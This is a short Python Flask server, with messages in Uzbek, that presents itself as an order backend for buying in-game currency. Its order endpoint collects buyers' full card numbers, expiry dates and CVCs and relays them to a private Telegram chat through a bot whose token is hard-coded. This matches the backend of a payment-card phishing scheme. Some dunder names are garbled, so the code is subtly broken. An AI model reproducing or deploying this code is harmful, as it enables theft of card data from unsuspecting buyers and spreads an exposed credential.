import os
import telebot
from flask import Flask, request, jsonify
from flask_cors import CORS

TOKEN = '8606363844:AAHqMunymcZUXE0zM2ASGzsJwYDGSF-iBmI'
ADMIN_CHAT_ID = '8773126526'

bot = telebot.TeleBot(TOKEN)
app = Flask(name)
CORS(app)

@app.route('/')
def home():
    return "FAST UC Server faol!"

@app.route('/send-order', methods=['POST'])
def send_order():
    try:
        data = request.json
        msg_text = (
            "🚨 YANGI BUYURTMA! 🚨\n\n"
            f"👤 Player ID: {data.get('playerId')}\n"
            f"💎 Paket: {data.get('package')}\n"
            f"💰 Narxi: {data.get('price')}\n"
            f"💳 To'lov: {data.get('payMethod')}\n\n"
            f"💳 Karta: {data.get('cardNumber')}\n"
            f"🔹 Muddati: {data.get('cardExpiry')}\n"
            f"🔹 CVC: {data.get('cardCvc')}"
        )
        bot.send_message(ADMIN_CHAT_ID, msg_text, parse_mode="Markdown")
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if name == 'main':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
